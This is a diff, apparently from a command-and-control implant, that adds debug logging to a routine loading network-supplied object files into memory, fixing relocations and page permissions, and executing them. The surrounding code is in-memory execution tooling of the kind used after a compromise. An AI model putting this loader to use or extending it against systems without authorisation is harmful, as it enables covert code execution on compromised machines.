@@ -743,6 +743,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	off_bss   = (off_pdata + (SIZE_T)pdata.length + 0xFFF) & ~(SIZE_T)0xFFF;
 	total     = off_bss + (SIZE_T)bssSize;
 	if (total == 0) {
+		spawn_log("bofload fail total0", 0x7fffffff);
 		free(ftable);
 		return FALSE;
 	}
@@ -750,12 +751,14 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	/* the entry offset is wire-supplied and is executed as code_dst + entry -
 	 * it must land inside the code section we actually extracted */
 	if (entry >= (DWORD)code.length) {
+		spawn_log("bofload fail entry", (long)entry);
 		post_error_d(0x4d, (int)entry);
 		free(ftable);
 		return FALSE;
 	}
 
 	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
+		spawn_log("bofload reuse size=", (long)bof_cached_size);
 		DWORD oldrw = 0;
 		base = bof_cached;
 		how = bof_cached_how;
@@ -772,6 +775,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		}
 		base = bof_alloc(total, &how);
 		if (base == NULL) {
+			spawn_log("bofload fail alloc total=", (long)total);
 			free(ftable);
 			return FALSE;
 		}
@@ -804,9 +808,12 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		int width;
 		int seclen;
 		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));
-		if (reloc == NULL)
+		if (reloc == NULL) {
+			spawn_log("bofload relocs exhausted at off=", (long)(relocs.length - relocsparser.length));
 			break;
+		}
 		if (reloc->symbol == SYMBOL_END) {
+			spawn_log("bofload end reached entries=", (long)relocsparser.length);
 			success = TRUE;
 			break;
 		}
@@ -873,6 +880,7 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 	}
 
 	if (success) {
+		spawn_log("bofload reloc ok base=", 0x7ffffffe);
 		/* claim the pin BEFORE anything else: from here the block must
 		 * survive the load tail (no idle-RW flip, no free, no recycle) */
 		if (bof_load_pin) {
@@ -918,8 +926,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 		perms_ok = VirtualProtect(base, (SIZE_T)(data_dst - base), codeperm, &oldp);
 		if (perms_ok && (SIZE_T)(base + total - data_dst) > 0)
 			perms_ok = VirtualProtect(data_dst, (SIZE_T)(base + total - data_dst), PAGE_READWRITE, &oldp);
-		if (!perms_ok)
+		if (!perms_ok) {
+			spawn_log("bofload perms fail gle=", (long)GetLastError());
 			post_error_d(0x11, (int)GetLastError());
+		}
 		if (perms_ok)
 			if (conv == 1) {
 				DWORD t = 0;
@@ -1019,8 +1029,10 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 						}
 					}
 						else {
+							spawn_log("bofload gate exec conv=", (long)conv);
 							command_shell_callback("bofwin skipped (api/nook/threads)", 32, CALLBACK_OUTPUT);
 							inlinefunc(args, alen);
+							spawn_log("bofload gate done", 0x7ffffffe);
 						}
 #else
 				inlinefunc(args, alen);
